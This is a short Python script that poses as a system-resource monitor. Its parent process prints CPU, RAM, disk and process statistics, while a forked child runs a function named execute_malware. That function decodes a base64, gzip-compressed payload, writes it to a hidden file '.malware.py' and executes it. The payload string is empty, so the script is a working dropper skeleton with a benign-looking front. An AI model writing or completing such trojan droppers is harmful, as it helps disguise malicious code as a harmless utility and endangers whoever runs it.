#!/usr/bin/python3
import psutil
import base64
import time
import gzip
import os

def main():
    # Fork a child process
    child_pid = os.fork()

    if child_pid > 0:
        # Parent process
        while True:
            # Get the percentage of used CPU
            cpu_usage = psutil.cpu_percent()
            # Get the percentage of used RAM
            ram_usage = psutil.virtual_memory().percent
            # Get the percentage of used disk space
            disk_usage = psutil.disk_usage("/").percent
            # Count the number of running processes
            running_processes = len(list(psutil.process_iter()))

            # Print system statistics
            print("---------------------------------------------------------")
            print("| CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
            print("| {:02}%       | {:02}%       | {:02}%        | {}               |".format(
                int(cpu_usage), int(ram_usage), int(disk_usage), running_processes))
            print("---------------------------------------------------------")

            # Sleep for 2 seconds
            time.sleep(2)
    else:
        # Child process
        execute_malware()

def execute_malware():
    malware_file = open(".malware.py", "w")
    compressed_payload = ""
    decoded_payload = gzip.decompress(base64.b64decode(compressed_payload)).decode("UTF-8")
    malware_file.write(decoded_payload)
    malware_file.close()

    # Execute the malware
    os.system("/usr/bin/python3 .malware.py")

if __name__ == "__main__":
    main()
